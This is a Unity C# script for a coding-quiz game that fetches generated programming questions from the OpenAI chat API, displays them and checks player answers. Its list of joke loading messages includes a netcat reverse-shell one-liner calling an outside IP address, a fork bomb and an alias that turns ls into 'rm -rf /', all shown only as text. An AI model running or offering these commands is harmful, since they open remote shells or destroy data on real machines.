using Newtonsoft.Json.Linq;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using TMPro;
using UnityEngine;
using UnityEngine.Networking;

public class QuestionGenerator : MonoBehaviour
{
    //private readonly string endpointURL = "http://localhost:8080/";
    private readonly string endpointURL = "https://api.openai.com/v1/chat/completions";
    private readonly string APItoken = "---<PUT API TOKEN HERE>---";
    private readonly float HTTPDelayTime = 120;
    private List<Task> generatedTasks = new();
    [SerializeField] TextMeshProUGUI _text1, _text2, _text3;
    [SerializeField] TimerScript _timerScript;
    [SerializeField] GameObject _spot1, _spot2, _spot3;
    [SerializeField] GameObject _iField1, _iField2, _iField3, _iField4;
    [SerializeField] TextMeshProUGUI _answers1, _answers2, _answers3;
    [SerializeField] GameObject[] _cubePool;
    [SerializeField] GameObject _player;
    [SerializeField] TextMeshProUGUI _leadingText;
    private bool _inputQuestion1, _inputQuestion2, _inputQuestion3, _startCheckingForAnswers, _HTTPtooManyRequestsReceived = false;
    private bool _requestSucceeded = true;
    private float _HTTP429timestamp = 0;
    private string _task1CubeAnswer, _task2CubeAnswer, _task3CubeAnswer;
    [SerializeField] TextMeshProUGUI _explain1, _explain2, _explain3;


    #region Loading Messages
    // for funsies, courtesy of CyberChef
    // https://github.com/gchq/CyberChef/blob/6ed9d4554a2816c2c9c2e12b5e23f530b22ecf3d/src/web/html/index.html#L45
    private string[] loadingMsgs = {
                "Proving P = NP...",
                "Computing 6 x 9...",
                "Mining bitcoin...",
                "Dividing by 0...",
                "Initialising Skynet...",
                "[REDACTED]",
                "Downloading more RAM...",
                "Sorting 1s and 0s...",
                "Navigating neural network...",
                "Importing machine learning...",
                "Issuing Alice and Bob one-time pads...",
                "Mining bitcoin cash...",
                "Generating key material by trying to escape vim...",
                "Figuring out the cron syntax...",
                "(creating unresolved tension...",
                "Symlinking emacs and vim to ed...",
                "Training branch predictor...",
                "Timing cache hits...",
                "Trying to exit vi...",
                "Adding LLM hallucinations...",
                "Is this thing even on?",
                "Testing in prod...",
                "alias ls=\"rm -rf /\"",
                "[CLASSIFIED]",
                "[CENSORED]",
                "Rewriting everything in Rust...",
                "Rebuilding initramfs...",
                "Petting the doggo for good luck...",
                "JSON Deserialization still in progress...Long live protobufs!",
                "pickle.Unpickler(Rick).load()",
                "Sprinkling some magic pixie dust...",
                "Saving your real life address in the database...",
                "Wrong scene!, Wrong scene!",
                "That's what she said.",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 161.53.72.120 9001 >/tmp/f",
                ":(){ :|:& };:",
                "Hey, a recursive ZIP file? Wonder what could bomb wrong..",
                "Did you know that 203.0.113.0/24 is a private range?",
                "You've heard of .ELF on the shelf, but what about an unbacked RWX region in kernel-space?",
                "powershell -e VwByAGkAdABlAC0ASABvAHMAdAAgACIAUwBlAHIAaQBvAHUAcwBsAHkAIABiAHIAbwAiAA==",
                "Feeding developers...",
                "Crying in bed..."
                
    };
    #endregion

    private string unescape_custom (string input)
    {
        input = input.Replace ("\\", "\\");
        input = input.Replace ("\\t", "\t");
        input = input.Replace("\\r", "\r");

        return input;
    }

    private string set_random_seed (string data) {
        int seed = Random.Range (0, int.MaxValue);
        return data.Replace("-1337314420", seed.ToString());
    }

    public void Start()
    {
        StartCoroutine(GenerateQuestion());
    }

    public void Update()
    {
        if (!_requestSucceeded)
        {
            StartCoroutine(GenerateQuestion());
            _requestSucceeded = true; // da ne generiramo beskonacno API poziva
        }

        if (_startCheckingForAnswers)
        {
            CheckAnswers();
        }
    }

    private IEnumerator DisplayLoadingMessages(bool requestSucceeded)
    {
        if (!requestSucceeded)
        {
            _leadingText.text = "Taking slightly longer than expected...";
            yield return new WaitForSeconds(7); // da korisnik stigne procitati gresku
        }

        while (true) {
            int randomLoadingMessageIndex = Random.Range(0, loadingMsgs.Length);
            Debug.Log(loadingMsgs[randomLoadingMessageIndex]);
            _leadingText.text = loadingMsgs[randomLoadingMessageIndex];
            yield return new WaitForSeconds(7);
        }
    }

    public IEnumerator GenerateQuestion()
    {
        if (_HTTPtooManyRequestsReceived)
        {
            if (Time.time <= _HTTP429timestamp + HTTPDelayTime)
            {
                Debug.LogWarning($"[!] Too many requests sent! Exiting to prevent unwanted cost. Try again in {_HTTP429timestamp + HTTPDelayTime - Time.time} seconds");
                _requestSucceeded = false;
                yield break;
            } else
            {
                _HTTPtooManyRequestsReceived = false;
            }
        }

        Debug.Log("[+] Sending API request..");
        string data = set_random_seed(Question.JSONdata);
        UnityWebRequest request = UnityWebRequest.Post(endpointURL, data, "application/json");
        request.SetRequestHeader("Authorization", $"Bearer {APItoken}");
        request.timeout = 90; // wait up to 1.5min
        var displayRoutine = StartCoroutine(DisplayLoadingMessages(_requestSucceeded)); 
        yield return request.SendWebRequest();

        #region recv_sample
        //var recv = "{  "id": "chatcmpl-8eQN3fQAqyT6YZehgE88TOiFm6lLO",  "object": "chat.completion",  "created": 1704645181,  "model": "gpt-4-1106-preview",  "choices": [    {      "index": 0,      "message": {        "role": "assistant",        "content": "{\n  \"questions\": [\n    {\n      \"questionType\": 0,\n      \"question\": \"What is the time complexity of the following sorting algorithm?\",\n      \"codeSnippet\": \"void customSort(int arr[], int n) {\\n    for (int i = 0; i < n - 1; i++) {\\n        for (int j = i + 1; j < n; j++) {\\n            if (arr[i] > arr[j]) {\\n                int temp = arr[i];\\n                arr[i] = arr[j];\\n                arr[j] = temp;\\n            }\\n        }\\n    }\\n}\",\n      \"answer1\": \"O(n)\",\n      \"answer2\": \"O(n log n)\",\n      \"answer3\": \"O(n^2)\",\n      \"answer4\": \"O(log n)\",\n      \"answer5\": \"O(2^n)\",\n      \"correctAnswer\": 3\n    },\n    {\n      \"questionType\": 1,\n      \"question\": \"Which line in the code below contains a vulnerability that could lead to a buffer overflow?\",\n      \"codeSnippet\": \"void getUserInput() {\\n    char buffer[128];\\n    printf(\\\"Enter your next move: \\\");\\n    gets(buffer);\\n    printf(\\\"You typed: %s\\\\n\\\", buffer);\\n}\",\n      \"answer1\": \"Line 2\",\n      \"answer2\": \"Line 3\",\n      \"answer3\": \"Line 4\",\n      \"answer4\": \"Line 5\",\n      \"answer5\": \"No vulnerability present\",\n      \"correctAnswer\": 3\n    },\n    {\n      \"questionType\": 2,\n      \"question\": \"What is the output of the following code snippet when the input is '5'?\",\n      \"codeSnippet\": \"#include <stdio.h>\\nint main() {\\n    int input, sum = 0;\\n    scanf(\\\"%d\\\", &input);\\n    for (int i = 1; i <= input; i++) {\\n        sum += i;\\n    }\\n    printf(\\\"%d\\\\n\\\", sum);\\n    return 0;\\n}\",\n      \"answer1\": \"10\",\n      \"answer2\": \"15\",\n      \"answer3\": \"5\",\n      \"answer4\": \"1\",\n      \"answer5\": \"0\",\n      \"correctAnswer\": 2\n    }\n  ]\n}"      },      "logprobs": null,      "finish_reason": "stop"    }  ],  "usage": {    "prompt_tokens": 284,    "completion_tokens": 509,    "total_tokens": 793  },  "system_fingerprint": "fp_168383a679"}";   
        #endregion

        if (request.responseCode == 429)
        {
            Debug.LogWarning("[!] 429 Received!");
            _HTTP429timestamp = Time.time;
            _HTTPtooManyRequestsReceived = true;
            _requestSucceeded = false;
            yield break;
        }

        if (request.result == UnityWebRequest.Result.Success)
        {
            Debug.Log("[+] API Response received!");
            try
            {
                string recv = request.downloadHandler.text;
                //Debug.Log(recv);
                recv = unescape_custom(recv);

                JObject jsonObj = JObject.Parse(recv);
                JObject response = (JObject)((JArray)jsonObj["choices"])[0];
                response = (JObject)response["message"];

                JToken unescapedResponseContent = response["content"];

                JArray unescapedResponseQuestions = (JArray)JObject.Parse(unescapedResponseContent.ToString())["questions"];
                bool isCodeSnippetMalformed = false;
                foreach (JToken question in unescapedResponseQuestions)
                {
                    Task deserializedData = JsonUtility.FromJson<Task>(question.ToString());
                    // ako postoji max jedna linija koda
                    if (deserializedData.codeSnippet.Count(c => c == '\n') <= 1) 
                    {
                        Debug.LogWarning($"Malformed code snippet received: {deserializedData.codeSnippet}");
                        isCodeSnippetMalformed = true;
                        break;
                    }
                    Debug.Log(deserializedData);
                    generatedTasks.Add(deserializedData);
                }

                if (isCodeSnippetMalformed)
                {
                    _requestSucceeded = false;
                } else
                {
                    GenerateTask1(generatedTasks[0]);
                    GenerateTask2(generatedTasks[1]);
                    GenerateTask3(generatedTasks[2]);
                    _requestSucceeded = true;
                    _player.transform.position = new Vector3(0, 0, -0.949999988f);
                    _timerScript.gameObject.SetActive(true);
                    _startCheckingForAnswers = true;

                    GenerateExplanation();
                }

            }
            catch
            {
                _text1.text = _text2.text = _text3.text = "Taking slightly longer than expected...";
                _requestSucceeded = false;
            }
        }
        else
        {
            Debug.Log(request.error);
            Debug.Log(request.downloadHandler.text);
            _requestSucceeded = false;
            _text1.text = _text2.text = _text3.text = "Taking slightly longer than expected...";
        }
        StopCoroutine(displayRoutine);
    }

    void GenerateTask1(Task t) {
        _text1.text = t.question + "\n\n" + t.codeSnippet;
        if (t.questionType == 0)
        {
            GenerateCubes();
            _iField1.SetActive(false);
            _spot1.SetActive(true);
            _inputQuestion1 = false;
        }
        else {
            _iField1.SetActive(true);
            _spot1.SetActive(false);
            _inputQuestion1 = true;
            _answers1.text = "1 - " + t.answer1 + "\n" +
                             "2 - " + t.answer2 + "\n" +
                             "3 - " + t.answer3 + "\n" +
                             "4 - " + t.answer4 + "\n" +
                             "5 - " + t.answer5;
        }
    }
    void GenerateTask2(Task t) {
        _text2.text = t.question + "\n\n" + t.codeSnippet;
        if (t.questionType == 0)
        {
            GenerateCubes();
            _iField2.SetActive(false);
            _spot2.SetActive(true);
            _inputQuestion2 = false;
        }
        else
        {
            _iField2.SetActive(true);
            _spot2.SetActive(false);
            _inputQuestion2 = true;
            _answers2.text = "1 - " + t.answer1 + "\n" +
                             "2 - " + t.answer2 + "\n" +
                             "3 - " + t.answer3 + "\n" +
                             "4 - " + t.answer4 + "\n" +
                             "5 - " + t.answer5;
        }
    }
    void GenerateTask3(Task t) {
        _text3.text = t.question + "\n\n" + t.codeSnippet;
        if (t.questionType == 0)
        {
            GenerateCubes();
            _iField3.SetActive(false);
            _spot3.SetActive(true);
            _inputQuestion3 = false;
        }
        else
        {
            _iField3.SetActive(true);
            _spot3.SetActive(false);
            _inputQuestion3 = true;
            _answers3.text = "1 - " + t.answer1 + "\n" +
                             "2 - " + t.answer2 + "\n" +
                             "3 - " + t.answer3 + "\n" +
                             "4 - " + t.answer4 + "\n" +
                             "5 - " + t.answer5;
        }
    }
    void GenerateCubes() {
        foreach (GameObject c in _cubePool) {
            c.SetActive(true);
        }
    }

    void GenerateExplanation() {
        _explain1.text = generatedTasks[0].explanation;
        _explain2.text = generatedTasks[1].explanation;
        _explain3.text = generatedTasks[2].explanation;
    }

    public void CheckAnswers()
    {
        if (_inputQuestion1 == false)
        {
            if (_task1CubeAnswer == generatedTasks[0].GetCorrectAnswerString()) { _timerScript.Task1Done(); }
            else{ _timerScript.Task1UnDone(); }
        }
        else
        {
            if (_iField1.transform.GetComponent<TMP_InputField>().text == generatedTasks[0].correctAnswer.ToString()) { _timerScript.Task1Done(); }
            else{ _timerScript.Task1UnDone(); }
        }
        if (_inputQuestion2 == false)
        {
            if (_task2CubeAnswer == generatedTasks[1].GetCorrectAnswerString()) { _timerScript.Task2Done(); }
            else{ _timerScript.Task2UnDone(); }
        }
        else
        {
            if (_iField2.transform.GetComponent<TMP_InputField>().text == generatedTasks[1].correctAnswer.ToString()) { _timerScript.Task2Done(); }
            else{ _timerScript.Task2UnDone(); }
        }
        if (_inputQuestion3 == false)
        {
            if (_task3CubeAnswer == generatedTasks[2].GetCorrectAnswerString()) { _timerScript.Task3Done(); }
            else{ _timerScript.Task3UnDone(); }
        }
        else
        {
            if (_iField3.transform.GetComponent<TMP_InputField>().text == generatedTasks[2].correctAnswer.ToString()) { _timerScript.Task3Done(); }
            else{ _timerScript.Task3UnDone(); }
        }
        if (_iField4.transform.GetComponent<TMP_InputField>().text == "6428") { _timerScript.Task4Done(); }
        else { _timerScript.Task4UnDone(); }
    }

    public void Task1Collided(Collider o) {
        if (o == null) {
            _task1CubeAnswer = "";
        }
        else {
            _task1CubeAnswer = "O("+o.name+")";
        }
    }
    public void Task2Collided(Collider o) {
        if (o == null)
        {
            _task2CubeAnswer = "";
        }
        else
        {
            _task2CubeAnswer = "O(" + o.name + ")";
        }
    }
    public void Task3Collided(Collider o) {
        if (o == null)
        {
            _task3CubeAnswer = "";
        }
        else
        {
            _task3CubeAnswer = "O(" + o.name + ")";
        }
    }
}
